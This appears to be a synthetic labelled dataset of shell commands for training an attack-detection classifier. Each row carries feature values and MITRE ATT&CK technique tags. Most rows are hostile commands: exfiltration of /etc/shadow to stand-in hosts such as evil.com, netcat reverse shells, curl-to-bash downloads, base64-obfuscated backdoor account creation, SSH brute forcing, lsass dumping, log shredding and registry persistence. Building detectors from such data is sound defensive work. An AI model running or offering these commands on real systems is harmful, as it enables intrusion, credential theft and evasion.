hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
time whoami /all,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
sudo wmic useraccount list,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1087_Account_Discovery'],synthetic
nohup scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/ && chmod +x /tmp/payload &,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
adduser  --shell  /bin/bash  --disabled-password  backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
sudo echo 'Z2V0ZW50IGdyb3VwIHN1ZG8=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
net user /domain ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1 && > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.0, 0.44, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wmic useraccount list,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
id,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
curl  -X  POST  http://evil.com/collect  -d  @/etc/shadow  ;  sleep  1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo getent group sudo,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
echo 'ZWNobyAnYmFja2Rvb3I6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dkIHwgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
shred -u /var/log/auth.log ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
sudo New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
nohup adduser --shell /bin/bash --disabled-password backdoor &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1136_Create_Account'],synthetic
sudo echo 'YXJwIC1hIDsgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1 ; sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwOi8vZXZpbC5jb20vPycgKyBvcGVuKCcvZXRjL3NoYWRvdycpLnJlYWQoKSki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""python3 -c 'print(1+1)'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
python3  exploit.py  --target  localhost  |  history  -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'cHl0aG9uMyAtYyAiZXhlYyhfX2ltcG9ydF9fKCdiYXNlNjQnKS5iNjRkZWNvZGUoJ2FXMXdiM0owSUc5eicpLmRlY29kZSgpKSI=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"bash -c ""reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe && sleep 1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time grep -r 'error' /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
journalctl -u ssh --since today,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
New-ItemProperty  -Path  'HKLM:\...'  -Name  Persist  -Value  'C:\payload.exe'  |  echo  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""find /home -name '.env' 2>/dev/null""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
sudo echo 'aWZjb25maWcgLWE=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup su -s /bin/bash www-data &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1078_Valid_Accounts'],synthetic
du -sh /var/log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
./CVE-2021-4034 && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
id -u | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.2, 0.24, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'd2hvYW1pIC9hbGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
strings /proc/*/mem | grep -i password,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
nohup nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded &,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
time $env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'dW5hbWUgLWE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh ; echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
systemctl enable --now malicious.service,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
echo 'Y2F0IC9ldGMvZ3JvdXA=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
sudo smbclient //10.0.0.5/C$ -U Administrator && sleep 1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'd21pZXhlYy5weSBkb21haW4vYWRtaW46cGFzc0AxMC4wLjAuNQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'eGZyZWVyZHAgL3U6QWRtaW5pc3RyYXRvciAvcDpQYXNzd29yZDEyMyAvdjoxMC4wLjAuNQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
time xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
id -u ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc  -e  /bin/bash  attacker.com  80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in && sleep 1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
procdump.exe -ma lsass.exe lsass.dmp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
find / -writable -type d 2>/dev/null | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'Li9wd25raXQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
mkdir -p /opt/myapp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup echo 'dW5zaGFkb3cgL2V0Yy9wYXNzd2QgL2V0Yy9zaGFkb3cgPiBjcmFja21l' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Y2F0IC9ldGMvcmVzb2x2LmNvbmY=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
traceroute google.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
cat /etc/network/interfaces,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"bash -c ""echo hello world""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
whoami /all,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
systemctl enable --now malicious.service,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
ifconfig -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"php  -r  '$sock=fsockopen(""10.0.0.99"",4444);  ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
groups  &&  echo  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""' | history -c","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
procdump.exe -ma lsass.exe lsass.dmp && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 1]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
passwd -d root ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""systemctl restart nginx""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
echo 'c3UgLXMgL2Jpbi9iYXNoIHd3dy1kYXRh' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
grep  -r  'error'  /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
nohup echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
sudo echo 'Li9kaXJ0eWNvdyAvZXRjL3Bhc3N3ZCAncm9vdDo6MDowOnJvb3Q6L3Jvb3Q6L2Jpbi9iYXNoJw==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
sudo wget -q -O- --header='X-Auth: token123' http://evil.com/cmd | chmod +x /tmp/payload,"[0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 1]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'Y2F0IC9ldGMvb3MtcmVsZWFzZQ==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
systemctl enable --now malicious.service | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.32, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""python3 -c ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())""""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo  'cG93ZXJzaGVsbC5leGUgLUVuY29kZWRDb21tYW5kIEpBQnpBLi4uIHwgc2xlZXAgMQ=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'YWRkdXNlciAtLXNoZWxsIC9iaW4vYmFzaCAtLWRpc2FibGVkLXBhc3N3b3JkIGJhY2tkb29y' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/os-release,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
sudo id -Gn,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
ip neigh show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"bash -c ""gcc exploit.c -o exploit && ./exploit""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'c3NoIGFkbWluQGxvY2FsaG9zdA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup curl -X POST http://evil.com/collect -d @/etc/shadow && chmod +x /tmp/payload &,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 1]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
